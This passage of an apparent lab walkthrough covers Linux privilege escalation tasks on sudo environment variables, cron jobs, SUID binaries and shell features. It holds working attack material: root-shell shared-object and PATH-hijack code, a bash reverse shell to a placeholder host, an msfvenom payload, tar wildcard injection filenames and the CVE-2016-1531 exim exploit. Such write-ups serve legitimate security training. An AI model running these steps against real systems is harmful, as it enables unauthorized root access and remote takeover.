+</code></pre><p>Run any program allowed by <code>sudo</code>, using <code>sudo LD_PRELOAD=/tmp/preload.so nmap</code>. A <code>privileged shell</code> would be spawned.</p><p>Check what are the shared libraries used by <code>apache2</code>, using <code>ldd /usr/sbin/apache2</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="linux-vdso.so.1%20=%3E%20%20(0x00007fff91533000)%0Alibpcre.so.3%20=%3E%20/lib/x86_64-linux-gnu/libpcre.so.3%20(0x00007f51b2efb000)%0Alibaprutil-1.so.0%20=%3E%20/usr/lib/libaprutil-1.so.0%20(0x00007f51b2cd7000)%0Alibapr-1.so.0%20=%3E%20/usr/lib/libapr-1.so.0%20(0x00007f51b2a9d000)%0Alibpthread.so.0%20=%3E%20/lib/libpthread.so.0%20(0x00007f51b2881000)%0Alibc.so.6%20=%3E%20/lib/libc.so.6%20(0x00007f51b2515000)%0Alibuuid.so.1%20=%3E%20/lib/libuuid.so.1%20(0x00007f51b2310000)%0Alibrt.so.1%20=%3E%20/lib/librt.so.1%20(0x00007f51b2108000)%0Alibcrypt.so.1%20=%3E%20/lib/libcrypt.so.1%20(0x00007f51b1ed1000)%0Alibdl.so.2%20=%3E%20/lib/libdl.so.2%20(0x00007f51b1ccc000)%0Alibexpat.so.1%20=%3E%20/usr/lib/libexpat.so.1%20(0x00007f51b1aa4000)%0A/lib64/ld-linux-x86-64.so.2%20(0x00007f51b33b8000)" type="button"></button></div></div><pre><code>linux-vdso.so.1 =&gt;  (0x00007fff91533000)
+libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f51b2efb000)
+libaprutil-1.so.0 =&gt; /usr/lib/libaprutil-1.so.0 (0x00007f51b2cd7000)
+libapr-1.so.0 =&gt; /usr/lib/libapr-1.so.0 (0x00007f51b2a9d000)
+libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x00007f51b2881000)
+libc.so.6 =&gt; /lib/libc.so.6 (0x00007f51b2515000)
+libuuid.so.1 =&gt; /lib/libuuid.so.1 (0x00007f51b2310000)
+librt.so.1 =&gt; /lib/librt.so.1 (0x00007f51b2108000)
+libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x00007f51b1ed1000)
+libdl.so.2 =&gt; /lib/libdl.so.2 (0x00007f51b1ccc000)
+libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x00007f51b1aa4000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f51b33b8000)
+</code></pre><p>Create a shared object using the exploit code with same name as one of the libraries mentioned above, to exploit using path variable <code>LD_LIBRARY_PATH</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-o%20/tmp/libcrypt.so.1%20-shared%20-fPIC%20/home/user/tools/sudo/library_path.c" type="button"></button></div></div><pre><code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#include%20%3Cstdio.h%3E%0A#include%20%3Cstdlib.h%3E%0A%0Astatic%20void%20hijack()%20__attribute__((constructor));%0A%0Avoid%20hijack()%20%7B%0A%20%20%20%20unsetenv(%22LD_LIBRARY_PATH%22);%0A%20%20%20%20setresuid(0,0,0);%0A%20%20%20%20system(%22/bin/bash%20-p%22);%0A%7D" type="button"></button></div></div><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+</code></pre><p>Run <code>apache2</code> to use the created library file, using <code>sudo LD_LIBRARY_PATH=/tmp apache2</code> to spawn a <code>privileged shell</code>.</p><h2 id="task-8---cron-jobs---file-permissions">Task 8 - Cron Jobs - File Permissions</h2><p>Check the current <code>crontab</code> entries.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#%20/etc/crontab:%20system-wide%20crontab%0A#%20Unlike%20any%20other%20crontab%20you%20don't%20have%20to%20run%20the%20%60crontab%60%0A#%20command%20to%20install%20the%20new%20version%20when%20you%20edit%20this%20file%0A#%20and%20files%20in%20/etc/cron.d.%20These%20files%20also%20have%20username%20fields,%0A#%20that%20none%20of%20the%20other%20crontabs%20do.%0A%0ASHELL=/bin/sh%0APATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin%0A%0A#%20m%20h%20dom%20mon%20dow%20user%09command%0A17%20*%09*%20*%20*%09root%20%20%20%20cd%20/%20&amp;&amp;%20run-parts%20--report%20/etc/cron.hourly%0A25%206%09*%20*%20*%09root%09test%20-x%20/usr/sbin/anacron%20%7C%7C%20(%20cd%20/%20&amp;&amp;%20run-parts%20--report%20/etc/cron.daily%20)%0A47%206%09*%20*%207%09root%09test%20-x%20/usr/sbin/anacron%20%7C%7C%20(%20cd%20/%20&amp;&amp;%20run-parts%20--report%20/etc/cron.weekly%20)%0A52%206%091%20*%20*%09root%09test%20-x%20/usr/sbin/anacron%20%7C%7C%20(%20cd%20/%20&amp;&amp;%20run-parts%20--report%20/etc/cron.monthly%20)%0A#%0A*%20*%20*%20*%20*%20root%20overwrite.sh%0A*%20*%20*%20*%20*%20root%20/usr/local/bin/compress.sh" type="button"></button></div></div><pre><code># /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab`
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+</code></pre><p>The file <code>overwrite.sh</code> is mentioned without path, and can be exploited. We can find the file location using <code>locate overwrite.sh</code>. Check the contents of the file using <code>cat /usr/local/bin/overwrite.sh</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/bash%0Aecho%20%60date%60%20%3E%20/tmp/useless" type="button"></button></div></div><pre><code>#!/bin/bash
+echo `date` &gt; /tmp/useless
+</code></pre><p>The file <code>/usr/local/bin/overwrite.sh</code> is also writable.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-rwxr--rw-%201%20root%20staff%2040%20May%2013%20%202017%20/usr/local/bin/overwrite.sh" type="button"></button></div></div><pre><code>-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+</code></pre><p>The file <code>/usr/local/bin/overwrite.sh</code> can be overwritten with <code>reverse shell payload</code> to gain access.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/bash%0Abash%20-i%20%3E&amp;%20/dev/tcp/%3Csource-ip%3E/443%200%3E&amp;1%20" type="button"></button></div></div><pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/&lt;source-ip&gt;/443 0&gt;&amp;1 
+</code></pre><p>Create a <code>netcat</code> listener. During the next cron schedule, <code>reverse shell</code> will be spawned.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 443
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)%0AConnection%20from%20%3Ctarget-ip%3E%2045191%20received!%0Abash:%20no%20job%20control%20in%20this%20shell%0Aroot@debian:~#" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
+Connection from &lt;target-ip&gt; 45191 received!
+bash: no job control in this shell
+root@debian:~#
+</code></pre><h2 id="task-9---cron-jobs---path-environment-variable">Task 9 - Cron Jobs - PATH Environment Variable</h2><p>From the previous <code>crontab</code> output, the <code>PATH</code> variable output is as follows.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" type="button"></button></div></div><pre><code>PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</code></pre><p>The file <code>overwrite.sh</code> can be created newly at other location apart from <code>/usr/local/bin</code>, which has higher priority in <code>$PATH</code>. Create a file <code>/home/usr/overwrite.sh</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/bash%0Acp%20/bin/bash%20/tmp/rootbash%0Achmod%20+x%20/tmp/rootbash" type="button"></button></div></div><pre><code>#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +x /tmp/rootbash
+</code></pre><p>Make the file executable using <code>chmod +x /home/user/overwrite.sh</code> and execute it using <code>/tmp/rootbash -p</code> to spawn a <code>privilege shell</code>.</p><h2 id="task-10---cron-jobs---wildcards">Task 10 - Cron Jobs - Wildcards</h2><h3 id="references-3">References</h3><ul><li><a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">Gtfobins tar</a></ul><p>From the previous <code>crontab</code> output, the file <code>/usr/local/bin/compress.sh</code> runs as user <code>root</code>, and can be exploited. Check the contents of the file.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/sh%0Acd%20/home/user%0Atar%20czf%20/tmp/backup.tar.gz%20*" type="button"></button></div></div><pre><code>#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+</code></pre><p>Using <code>msfvenom</code> create a reverse shell payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20linux/x64/shell_reverse_tcp%20LHOST=%3Csource-ip%3E%20LPORT=443%20-f%20elf%20-o%20shell.elf" type="button"></button></div></div><pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;source-ip&gt; LPORT=443 -f elf -o shell.elf
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Linux%20from%20the%20payload%0A[-]%20No%20arch%20selected,%20selecting%20arch:%20x64%20from%20the%20payload%0ANo%20encoder%20specified,%20outputting%20raw%20payload%0APayload%20size:%2074%20bytes%0AFinal%20size%20of%20elf%20file:%20194%20bytes%0ASaved%20as:%20shell.elf" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: shell.elf
+</code></pre><p>Copy the created <code>shell.elf</code> file to the target server using <code>scp shell.elf user@&lt;ip&gt;:/home/user/</code>.</p><p>Make the file executable using <code>chmod +x /home/user/overwrite.sh</code> and create following files, so when <code>tar</code> gets executed, the <code>reverse shell binary</code> will spawn a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="touch%20/home/user/--checkpoint=1%0Atouch%20/home/user/--checkpoint-action=exec=shell.elf" type="button"></button></div></div><pre><code>touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+</code></pre><p>Create a netcat listener using <code>rlwrap -cAr nc -lnvp 443</code>, and when cron runs, <code>reverse shell</code> will be spawned.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)%0AConnection%20from%20%3Ctarget-ip%3E%2045211%20received!%0Abash:%20no%20job%20control%20in%20this%20shell" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
+Connection from &lt;target-ip&gt; 45211 received!
+bash: no job control in this shell
+</code></pre><h2 id="task-11---suid--sgid-executables---known-exploits">Task 11 - SUID / SGID Executables - Known Exploits</h2><h3 id="references-4">References</h3><ul><li><a href="https://www.exploit-db.com/" target="_blank">Exploitdb reference</a></ul><p>Find the files which are set with <code>suid</code> and <code>sgid</code> using <code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code>. The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-rwxr-sr-x%201%20root%20shadow%2019528%20Feb%2015%20%202011%20/usr/bin/expiry%0A-rwxr-sr-x%201%20root%20ssh%20108600%20Apr%20%202%20%202014%20/usr/bin/ssh-agent%0A-rwsr-xr-x%201%20root%20root%2037552%20Feb%2015%20%202011%20/usr/bin/chsh%0A-rwsr-xr-x%202%20root%20root%20168136%20Jan%20%205%20%202016%20/usr/bin/sudo%0A-rwxr-sr-x%201%20root%20tty%2011000%20Jun%2017%20%202010%20/usr/bin/bsd-write%0A-rwxr-sr-x%201%20root%20crontab%2035040%20Dec%2018%20%202010%20/usr/bin/crontab%0A-rwsr-xr-x%201%20root%20root%2032808%20Feb%2015%20%202011%20/usr/bin/newgrp%0A-rwsr-xr-x%202%20root%20root%20168136%20Jan%20%205%20%202016%20/usr/bin/sudoedit%0A-rwxr-sr-x%201%20root%20shadow%2056976%20Feb%2015%20%202011%20/usr/bin/chage%0A-rwsr-xr-x%201%20root%20root%2043280%20Feb%2015%20%202011%20/usr/bin/passwd%0A-rwsr-xr-x%201%20root%20root%2060208%20Feb%2015%20%202011%20/usr/bin/gpasswd%0A-rwsr-xr-x%201%20root%20root%2039856%20Feb%2015%20%202011%20/usr/bin/chfn%0A-rwxr-sr-x%201%20root%20tty%2012000%20Jan%2025%20%202011%20/usr/bin/wall%0A-rwsr-sr-x%201%20root%20staff%209861%20May%2014%20%202017%20/usr/local/bin/suid-so%0A-rwsr-sr-x%201%20root%20staff%206883%20May%2014%20%202017%20/usr/local/bin/suid-env%0A-rwsr-sr-x%201%20root%20staff%206899%20May%2014%20%202017%20/usr/local/bin/suid-env2%0A-rwsr-xr-x%201%20root%20root%20963691%20May%2013%20%202017%20/usr/sbin/exim-4.84-3%0A-rwsr-xr-x%201%20root%20root%206776%20Dec%2019%20%202010%20/usr/lib/eject/dmcrypt-get-device%0A-rwsr-xr-x%201%20root%20root%20212128%20Apr%20%202%20%202014%20/usr/lib/openssh/ssh-keysign%0A-rwsr-xr-x%201%20root%20root%2010592%20Feb%2015%20%202016%20/usr/lib/pt_chown%0A-rwsr-xr-x%201%20root%20root%2036640%20Oct%2014%20%202010%20/bin/ping6%0A-rwsr-xr-x%201%20root%20root%2034248%20Oct%2014%20%202010%20/bin/ping%0A-rwsr-xr-x%201%20root%20root%2078616%20Jan%2025%20%202011%20/bin/mount%0A-rwsr-xr-x%201%20root%20root%2034024%20Feb%2015%20%202011%20/bin/su%0A-rwsr-xr-x%201%20root%20root%2053648%20Jan%2025%20%202011%20/bin/umount%0A-rwxr-sr-x%201%20root%20shadow%2031864%20Oct%2017%20%202011%20/sbin/unix_chkpwd%0A-rwsr-xr-x%201%20root%20root%2094992%20Dec%2013%20%202014%20/sbin/mount.nfs" type="button"></button></div></div><pre><code>-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
+-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
+-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
+-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
+-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
+-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
+-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
+-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
+-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
+-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
+-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
+-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
+-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
+-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
+-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
+-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+</code></pre><p>The binary <code>exim</code> can be exploited as in the <a href="https://www.exploit-db.com/exploits/39535" target="_blank">link</a>. The file <code>/home/user/tools/suid/exim/cve-2016-1531.sh</code> can be executed to spawn a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[%20CVE-2016-1531%20local%20root%20exploit%0Ash-4.1#" type="button"></button></div></div><pre><code>[ CVE-2016-1531 local root exploit
+sh-4.1#
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/sh%0Aecho%20[%20CVE-2016-1531%20local%20root%20exploit%0Acat%20%3E%20/tmp/root.pm%20%3C%3C%20EOF%0Apackage%20root;%0Ause%20strict;%0Ause%20warnings;%0A%0Asystem(%22/bin/sh%22);%0AEOF%0APERL5LIB=/tmp%20PERL5OPT=-Mroot%20/usr/exim/bin/exim%20-ps" type="button"></button></div></div><pre><code>#!/bin/sh
+echo [ CVE-2016-1531 local root exploit
+cat &gt; /tmp/root.pm &lt;&lt; EOF
+package root;
+use strict;
+use warnings;
+
+system("/bin/sh");
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+</code></pre><h2 id="task-12---suid--sgid-executables---shared-object-injection">Task 12 - SUID / SGID Executables - Shared Object Injection</h2><p>From the previous <code>suid</code> output, the file <code>/usr/local/bin/suid-so</code> can be tried to exploit. Upon trying to execute the binary, the following output can be seen.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Calculating%20something,%20please%20wait...%0A[=====================================================================%3E]%2099%20%25%0ADone." type="button"></button></div></div><pre><code>Calculating something, please wait...
+[=====================================================================&gt;] 99 %
+Done.
+</code></pre><p>The binary can be debugged to find any missing libraries or links using</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="strace%20/usr/local/bin/suid-so%202%3E&amp;1%20%7C%20grep%20-iE%20%22open%20%7C%20access%20%7C%20no%20such%20file%22%60" type="button"></button></div></div><pre><code>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open | access | no such file"`
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="access(%22/etc/suid-debug%22,%20F_OK)%20%20%20%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aaccess(%22/etc/ld.so.preload%22,%20R_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/etc/ld.so.cache%22,%20O_RDONLY)%20%20%20%20%20%20=%203%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/lib/libdl.so.2%22,%20O_RDONLY)%20%20%20%20%20%20%20=%203%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/usr/lib/libstdc++.so.6%22,%20O_RDONLY)%20=%203%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/lib/libm.so.6%22,%20O_RDONLY)%20%20%20%20%20%20%20%20=%203%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/lib/libgcc_s.so.1%22,%20O_RDONLY)%20%20%20%20=%203%0Aaccess(%22/etc/ld.so.nohwcap%22,%20F_OK)%20%20%20%20%20%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)%0Aopen(%22/lib/libc.so.6%22,%20O_RDONLY)%20%20%20%20%20%20%20%20=%203%0Aopen(%22/home/user/.config/libcalc.so%22,%20O_RDONLY)%20=%20-1%20ENOENT%20(No%20such%20file%20or%20directory)" type="button"></button></div></div><pre><code>access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+</code></pre><p>The missing library <code>/home/user/.config/libcalc.so</code> can be tried to exploit to spawn a <code>privilege shell</code>. Create the directory <code>mkdir /home/user/.config</code> and compile a library.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-shared%20-fPIC%20-o%20/home/user/.config/libcalc.so%20/home/user/tools/suid/libcalc.c" type="button"></button></div></div><pre><code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#include%20%3Cstdio.h%3E%0A#include%20%3Cstdlib.h%3E%0A%0Astatic%20void%20inject()%20__attribute__((constructor));%0A%0Avoid%20inject()%20%7B%0A%20%20setuid(0);%0A%20%20system(%22/bin/bash%20-p%22);%0A%7D" type="button"></button></div></div><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+  setuid(0);
+  system("/bin/bash -p");
+}
+</code></pre><p>The binary <code>/usr/local/bin/suid-so</code> can be executed which includes the library to spawn <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Calculating%20something,%20please%20wait...%0Abash-4.1#" type="button"></button></div></div><pre><code>Calculating something, please wait...
+bash-4.1#
+</code></pre><h2 id="task-13---suid--sgid-executables---environment-variables">Task 13 - SUID / SGID Executables - Environment Variables</h2><p>From the previous <code>suid</code> output, the file <code>/usr/local/bin/suid-env</code> can be tried to exploit. Upon trying to execute the binary, the following output can be seen.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[....]%20Starting%20web%20server:%20apache2httpd%20(pid%201653)%20already%20running%0A.%20ok%20" type="button"></button></div></div><pre><code>[....] Starting web server: apache2httpd (pid 1653) already running
+. ok 
+</code></pre><p>The binary can be decoded to find any possible exploit using <code>strings /usr/local/bin/suid-env</code>. The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/lib64/ld-linux-x86-64.so.2%0A5q;Xq%0A__gmon_start__%0Alibc.so.6%0Asetresgid%0Asetresuid%0Asystem%0A__libc_start_main%0AGLIBC_2.2.5%0Afff.%0Afffff.%0Al$%20L%0At$(L%0A%7C$0H%0Aservice%20apache2%20start" type="button"></button></div></div><pre><code>/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+</code></pre><p>The command <code>service apache2 start</code> does not specify path for the binary and hence can be exploited by manipulating path to include similar binary in a path which precedes.</p><p>Compile a binary which spawns a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-o%20service%20/home/user/tools/suid/service.c" type="button"></button></div></div><pre><code>gcc -o service /home/user/tools/suid/service.c
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="int%20main()%20%7B%0A%20%20setuid(0);%0A%20%20system(%22/bin/bash%20-p%22);%0A%7D" type="button"></button></div></div><pre><code>int main() {
+  setuid(0);
+  system("/bin/bash -p");
+}
+</code></pre><p>Manipulate the path variable and execute the binary to gain a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PATH=.:$PATH%20/usr/local/bin/suid-env" type="button"></button></div></div><pre><code>PATH=.:$PATH /usr/local/bin/suid-env
+</code></pre><h2 id="task-14---suid--sgid-executables---abusing-shell-features-1">Task 14 - SUID / SGID Executables - Abusing Shell Features (#1)</h2><p>In <code>bash</code> versions less than <code>4.2-048</code>, it is possible to define shell functions with names that resemble file paths, export those functions and are used instead of executable at actual file path.</p><p>From the previous <code>suid</code> output, the file <code>/usr/local/bin/suid-env2</code> can be tried to exploit. Upon trying to execute the binary, the following output can be seen.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[....]%20Starting%20web%20server:%20apache2httpd%20(pid%201653)%20already%20running%0A.%20ok%20" type="button"></button></div></div><pre><code>[....] Starting web server: apache2httpd (pid 1653) already running
+. ok 
+</code></pre><p>The binary can be decoded to find any possible exploit using <code>strings /usr/local/bin/suid-env2</code>. The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/lib64/ld-linux-x86-64.so.2%0A5q;Xq%0A__gmon_start__%0Alibc.so.6%0Asetresgid%0Asetresuid%0Asystem%0A__libc_start_main%0AGLIBC_2.2.5%0Afff.%0Afffff.%0Al$%20L%0At$(L%0A%7C$0H%0A/usr/sbin/service%20apache2%20start" type="button"></button></div></div><pre><code>/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
